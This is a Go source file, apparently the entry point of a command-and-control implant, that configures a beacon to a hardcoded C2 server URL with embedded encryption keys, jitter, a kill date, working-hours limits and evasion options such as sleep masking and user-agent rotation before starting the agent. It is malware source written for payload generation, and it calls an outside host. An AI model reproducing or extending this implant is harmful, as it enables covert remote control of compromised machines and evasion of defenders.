package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"strconv"
	"time"
)

// Build-time variables — overridden by -ldflags during payload generation
var (
	serverURL    = "http://192.168.10.102:8080"
	encKey       = "SpookyOrcaC2AES1"
	secondaryKey = "TaburtuaiSecondary"

	// Beacon timing
	defaultInterval = "30"  // seconds
	defaultJitter   = "30"  // percent (0-100)

	// OPSEC profile fields
	defaultMaxRetries        = "5"
	defaultKillDate          = ""      // YYYY-MM-DD; empty = never
	defaultWorkingHoursOnly  = "false"
	defaultWorkingHoursStart = "0"     // 24h, e.g. 8
	defaultWorkingHoursEnd   = "0"     // 24h, e.g. 18

	// Evasion flags
	defaultEnableEvasion     = "false"
	defaultSleepMasking      = "false"
	defaultUserAgentRotation = "false"

	// Debug mode — keeps console open on exit (Windows)
	debugMode = "false"
)

func main() {
	interval, _ := strconv.Atoi(defaultInterval)
	if interval < 1 {
		interval = 30
	}

	jitterPct, _ := strconv.Atoi(defaultJitter)
	if jitterPct < 0 || jitterPct > 100 {
		jitterPct = 30
	}

	maxRetries, _ := strconv.Atoi(defaultMaxRetries)
	if maxRetries < 1 {
		maxRetries = 5
	}

	workStart, _ := strconv.Atoi(defaultWorkingHoursStart)
	workEnd, _ := strconv.Atoi(defaultWorkingHoursEnd)

	cfg := &AgentConfig{
		ServerURL:         serverURL,
		PrimaryKey:        encKey,
		SecondaryKey:      secondaryKey,
		Interval:          interval,
		JitterPercent:     jitterPct,
		MaxRetries:        maxRetries,
		KillDate:          defaultKillDate,
		WorkingHoursOnly:  defaultWorkingHoursOnly == "true",
		WorkingHoursStart: workStart,
		WorkingHoursEnd:   workEnd,
		EnableEvasion:     defaultEnableEvasion == "true",
		SleepMasking:      defaultSleepMasking == "true",
		UserAgentRotation: defaultUserAgentRotation == "true",
	}

	agent, err := NewAgent(cfg)
	if err != nil {
		fmt.Printf("[!] Failed to create agent: %v\n", err)
		pauseIfDebug()
		os.Exit(1)
	}

	if err := agent.Start(); err != nil {
		fmt.Printf("[!] Agent failed: %v\n", err)
		pauseIfDebug()
		os.Exit(1)
	}
	pauseIfDebug()
}

// pauseIfDebug waits for Enter before exiting when debugMode == "true"
func pauseIfDebug() {
	if debugMode == "true" {
		fmt.Print("\n[DEBUG] Press Enter to exit...")
		fmt.Scanln()
	}
}

func generateUUID() string {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		now := time.Now().UnixNano()
		for i := range b {
			b[i] = byte((now >> (i * 8)) & 0xFF)
		}
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
